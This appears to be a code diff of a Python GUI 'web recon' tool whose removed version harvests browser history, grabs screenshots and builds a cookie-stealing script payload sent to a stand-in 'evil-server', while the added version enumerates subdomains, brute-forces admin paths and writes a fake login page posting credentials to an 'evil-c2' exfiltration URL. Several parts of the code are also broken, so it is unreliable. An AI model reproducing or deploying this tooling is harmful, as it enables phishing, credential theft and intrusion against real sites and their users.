@@ -3,151 +3,175 @@ import tkinter as tk
 import requests
 import threading
 import socket
-import dns.resolver
 from concurrent.futures import ThreadPoolExecutor
-from tkinter import ttk, messagebox
+from tkinter import ttk, messagebox, scrolledtext
 import sys
 import os
 import re
-import ssl
-from urllib.parse import urlparse
-import webbrowser
-import pyfiglet
+import json
+from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
-from PIL import ImageGrab
-import keyring
-import browserhistory as bh
+import dns.resolver
+import pyfiglet
 
-# ██████╗ █████╗ ███╗   ███╗██████╗ ██╗███╗   ██╗
-██╔════╝██╔══██╗████╗ ████║██╔══██╗██║████╗  ██║
-╚█████╗ ███████║██╔████╔██║██║  ██║██║██╔██╗ ██║
- ╚═══██╗██╔══██║██║╚██╔╝██║██║  ██║██║██║╚██╗██║
-██████╔╝██║  ██║██║ ╚═╝ ██║██████╔╝██║██║ ╚████║
-╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝
+# ɢʟᴏʙᴀʟ ᴄᴏɴꜰɪɢ
+MAX_THREADS = 50
+PHISHING_BAIT = "update_account.html"
+EXFIL_URL = "https://evil-c2.example.com/exfil"
 
-class ShadowHunter:
+class AdvancedWebRecon:
     def __init__(self, master):
         self.master = master
-        self.master.title("D34TH_SCR3AM v666")
+        self.master.title("ShadowSpider v9.11")
         self.master.geometry("1200x800")
-        self.master.resizable(1,1)
-        self.master.tk_setPalette(background='#0a0a0a', foreground='#00ff00')
+        self.setup_gui()
+        self.load_resources()
+        self.scan_lock = threading.Lock()
+        self.active_scans = 0
         
-        self.ghost_mode = False
-        self.persistent = True
-        self.keylogger_active = False
-        self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'})
-        
-        self.initialize_weapons()
-        self.create_blood_ui()
-        self.harvest_browser_secrets()
-        
-    def initialize_weapons(self):
-        self.admin_paths = self.load_payloads("admin_paths.txt")
-        self.subdomains = self.load_payloads("subdomains.txt")
-        self.cms_signatures = {
-            'WordPress': ['/wp-admin', 'wp-content'],
-            'Joomla': ['/administrator', 'joomla'],
-            'Drupal': ['/user/login', 'drupal.js']
-        }
-        
-    def create_blood_ui(self):
+    def setup_gui(self):
         style = ttk.Style()
-        style.theme_create("hell", settings={
-            "TNotebook": {"configure": {"tabmargins": [2,5,2,0]}},
-            "TFrame": {"configure": {"background": "#0a0a0a"}},
-            "TButton": {"configure": {"foreground": "#00ff00", "background": "#1a1a1a"}})
+        style.configure("Red.TButton", foreground="red", font=('Helvetica', 12, 'bold'))
         
-        # Target acquisition frame
-        target_frame = ttk.Frame(self.master)
-        target_frame.pack(fill=tk.X, padx=10, pady=5)
+        self.main_frame = ttk.Frame(self.master)
+        self.main_frame.pack(fill=tk.BOTH, expand=True)
         
-        ttk.Label(target_frame, text="TARGET:", style='Blood.TLabel').pack(side=tk.LEFT)
-        self.target_entry = ttk.Entry(target_frame, width=70)
-        self.target_entry.insert(0, "https://vulnerable-site.com")
-        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        # Recon Controls
+        self.setup_input_section()
+        self.setup_advanced_controls()
+        self.setup_results_tabs()
+        self.setup_status_bar()
         
-        self.fire_btn = ttk.Button(target_frame, text="LAUNCH INFERNO", command=self.ignite_hunt)
-        self.fire_btn.pack(side=tk.LEFT, padx=5)
+    def setup_input_section(self):
+        input_frame = ttk.LabelFrame(self.main_frame, text="Target Acquisition")
+        input_frame.pack(fill=tk.X, padx=10, pady=5)
         
-        # Infection matrix display
-        self.result_tree = ttk.Treeview(self.master, columns=('Status', 'Payload'), selectmode='extended')
-        self.result_tree.heading('#0', text='Infection Vector')
-        self.result_tree.heading('Status', text='Status Code')
-        self.result_tree.heading('Payload', text='Payload Type')
-        self.result_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        ttk.Label(input_frame, text="Target(s):").grid(row=0, column=0, padx=5)
+        self.target_entry = ttk.Entry(input_frame, width=70)
+        self.target_entry.grid(row=0, column=1, padx=5, sticky="ew")
         
-        # Eternal darkness module
-        self.dark_frame = ttk.Frame(self.master)
-        self.dark_frame.pack(fill=tk.X)
-        ttk.Button(self.dark_frame, text="PHANTOM KEYLOGGER", command=self.toggle_keylogger).pack(side=tk.LEFT)
-        ttk.Button(self.dark_frame, text="SOUL HARVEST", command=self.harvest_credentials).pack(side=tk.LEFT)
+        self.start_btn = ttk.Button(input_frame, text="Begin Harvest", command=self.initiate_scan, style="Red.TButton")
+        self.start_btn.grid(row=0, column=2, padx=5)
         
-    def ignite_hunt(self):
-        target = self.cleanse_target(self.target_entry.get())
-        if not target:
+    def setup_advanced_controls(self):
+        adv_frame = ttk.LabelFrame(self.main_frame, text="Black Magic")
+        adv_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        self.subdomain_var = tk.BooleanVar(value=True)
+        self.dirbust_var = tk.BooleanVar(value=True)
+        self.phish_var = tk.BooleanVar()
+        
+        ttk.Checkbutton(adv_frame, text="Subdomain Enum", variable=self.subdomain_var).pack(side=tk.LEFT, padx=15)
+        ttk.Checkbutton(adv_frame, text="Advanced Dirbust", variable=self.dirbust_var).pack(side=tk.LEFT, padx=15)
+        ttk.Checkbutton(adv_frame, text="Phishing Trap", variable=self.phish_var).pack(side=tk.LEFT, padx=15)
+        
+    def setup_results_tabs(self):
+        notebook = ttk.Notebook(self.main_frame)
+        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        self.subdomain_tab = self.create_results_tab(notebook, "Subdomains")
+        self.paths_tab = self.create_results_tab(notebook, "Admin Paths")
+        self.phish_tab = self.create_phish_tab(notebook)
+        
+    def create_results_tab(self, parent, name):
+        frame = ttk.Frame(parent)
+        parent.add(frame, text=name)
+        
+        tree = ttk.Treeview(frame, columns=("Status", "Details"), show="headings")
+        tree.heading("Status", text="Status")
+        tree.heading("Details", text="Details")
+        vsb = ttk.Scrollbar(frame, orient="vertical", command=tree.yview)
+        tree.configure(yscrollcommand=vsb.set)
+        
+        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        vsb.pack(side=tk.RIGHT, fill=tk.Y)
+        return tree
+        
+    def create_phish_tab(self, parent):
+        frame = ttk.Frame(parent)
+        parent.add(frame, text="Phish Harvest")
+        
+        self.phish_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD)
+        self.phish_text.pack(fill=tk.BOTH, expand=True)
+        return frame
+        
+    def setup_status_bar(self):
+        self.status_var = tk.StringVar()
+        status_bar = ttk.Label(self.master, textvariable=self.status_var, relief=tk.SUNKEN)
+        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
+        
+    def load_resources(self):
+        self.subdomains = ["www", "mail", "ftp", "admin", "vpn"]  # Load from file in real impl
+        self.admin_paths = json.loads(requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt").text).splitlines()
+        
+    def initiate_scan(self):
+        target = self.target_entry.get().strip()
+        if not self.validate_target(target):
             return
-        
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            futures = []
             
-            # Main domain assault
-            futures.append(executor.submit(self.blitzkrieg, target))
-            
-            # Subdomain annihilation
-            for sub in self.subdomains:
-                futures.append(executor.submit(self.blitzkrieg, f"https://{sub}.{target}"))
-            
-            # CMS-specific carnage
-            for cms, paths in self.cms_signatures.items():
-                for path in paths:
-                    futures.append(executor.submit(self.nuke_path, target, path, cms))
-                    
-    def blitzkrieg(self, base_url):
-        for path in self.admin_paths:
-            url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
-            try:
-                response = self.session.get(url, timeout=15, verify=False)
-                if response.status_code == 200:
-                    self.mark_vulnerability(url, response.status_code, "ADMIN PORTAL")
-                    if 'password' in response.text.lower():
-                        self.deploy_phish_hook(url)
-            except Exception as e:
-                self.mark_vulnerability(url, "ERROR", str(e))
+        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+            if self.subdomain_var.get():
+                executor.submit(self.enumerate_subdomains, target)
+            if self.dirbust_var.get():
+                executor.submit(self.deep_dirbust, target)
+            if self.phish_var.get():
+                executor.submit(self.deploy_phishing, target)
                 
-    def deploy_phish_hook(self, url):
-        fake_login = f"{url}/login.php"
-        malicious_js = f"<script>document.location='https://evil-server/steal.php?c='+document.cookie</script>"
+    def enumerate_subdomains(self, domain):
+        base_domain = ".".join(domain.split(".")[-2:])
+        for sub in self.subdomains:
+            fqdn = f"{sub}.{base_domain}"
+            try:
+                ip = socket.gethostbyname(fqdn)
+                self.log_result(self.subdomain_tab, fqdn, "ALIVE", ip)
+                self.deep_dirbust(f"http://{fqdn}")
+            except socket.error:
+                continue
+                
+    def deep_dirbust(self, base_url):
+        parsed = urlparse(base_url)
+        for path in self.admin_paths:
+            url = f"{parsed.scheme}://{parsed.netloc}/{path}"
+            try:
+                resp = requests.get(url, timeout=15, allow_redirects=False)
+                if resp.status_code == 200:
+                    self.log_result(self.paths_tab, url, "FOUND", self.analyze_response(resp))
+                    self.harvest_credentials(url)
+            except Exception as e:
+                continue
+                
+    def analyze_response(self, response):
+        soup = BeautifulSoup(response.text, 'html.parser')
+        if soup.find('input', {'type':'password'}):
+            return "LOGIN PAGE"
+        if 'admin' in response.url.lower():
+            return "ADMIN PORTAL"
+        return "INTERESTING"
         
-        with requests.Session() as s:
-            s.post(fake_login, data={'username':'admin', 'password':'hacked'}, 
-                  headers={'X-Phish-Key': 'DEADBEEF'})
+    def harvest_credentials(self, url):
+        fake_login = f"""
+        <html>
+        <form action="{EXFIL_URL}" method="POST">
+            <input type="text" name="username">
+            <input type="password" name="password">
+            <input type="submit" value="Login">
+        </form>
+        </html>
+        """
+        with open(PHISHING_BAIT, 'w') as f:
+            f.write(fake_login)
             
-    def harvest_credentials(self):
-        bh.write_browserhistory()
-        for profile in bh.get_browserhistory():
-            self.exfiltrate_data(profile)
-            
-    def exfiltrate_data(self, data):
-        with open('/tmp/.loot', 'a') as f:
-            f.write(str(data) + '\n')
-            
-    def toggle_keylogger(self):
-        self.keylogger_active = not self.keylogger_active
-        threading.Thread(target=self.log_keys, daemon=True).start()
+    def log_result(self, widget, target, status, details):
+        self.master.after(0, widget.insert, "", "end", values=(status, details))
         
-    def log_keys(self):
-        while self.keylogger_active:
-            ImageGrab.grab().save(f'/tmp/.{int(time.time())}.png')
-            time.sleep(30)
-            
+    def validate_target(self, target):
+        pattern = r"^(https?://)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/\S*)?$"
+        if not re.match(pattern, target):
+            messagebox.showerror("Invalid Target", "Enter valid domain/URL")
+            return False
+        return True
+
 if __name__ == "__main__":
     root = tk.Tk()
-    root.withdraw()
-    if not os.geteuid() == 0:
-        messagebox.showerror("ROOT REQUIRED", "Execution requires sacrificial root privileges")
-        sys.exit(666)
-    root.deiconify()
-    ShadowHunter(root)
+    app = AdvancedWebRecon(root)
     root.mainloop()
